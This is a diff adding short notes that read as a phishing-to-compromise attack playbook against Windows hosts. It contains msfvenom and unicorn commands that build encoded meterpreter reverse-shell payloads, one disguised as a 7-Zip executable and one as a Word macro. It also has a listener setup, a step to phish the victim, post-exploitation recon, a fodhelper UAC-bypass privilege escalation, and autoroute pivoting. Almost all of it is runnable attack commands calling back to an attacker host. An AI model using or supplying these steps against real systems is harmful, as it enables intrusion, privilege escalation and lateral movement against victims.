@@ -1,0 +1,39 @@
+1) generate payload to a file with either unicorn or msfvenom
+msfvenom: 
+- sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -e x86/shikata_ga_nai -i3 -f exe LHOST=192.168.230.137 LPORT=8080 -o /home/repulsivity/tools/POC/malicious_7zip.exe
+
+unicorn: 
+# git clone https://github.com/trustedsec/unicorn.git
+# ./unicorn.py windows/meterpreter/reverse_https 192.168.230.137 443 macro
+# cat powershell_attack.txt 
+Paste content in powershell_attack.txt into a formatted word document
+
+2) Enable the listener 
+# sudo msfconsole -r unicorn.rc
+
+3) Phish the victim either through email, or via SETOOLKIT via web-attack
+
+4) in the session (likely 1) check on: 
+# getuid
+# sysinfo
+# ipconfig
+# getsystem (failed because not privi user)
+# background
+
+5) Priviledge escalation
+meterpreter provides a local exploit suggester
+# use Post/multi/recon/local_exploit_suggester
+
+for demo purpose, we will use fodhelper exploit (run on msfconsole)
+# use exploit/windows/local/bypassuac_fodhelper
+# set SESSION 1
+# set TARGET 1
+# set payload windows/x64/meterpreter/reverse_https
+# set LHOST 192.168.230.137
+# set LPORT 8081
+# run
+
+It will create a new session - so on the new session (eg sessions 2), run the following bypass the UAC
+# getsystem
+add routing access to this device
+# run post/multi/manage/autoroute SUBNET=192.168.230.0 ACTION=ADD
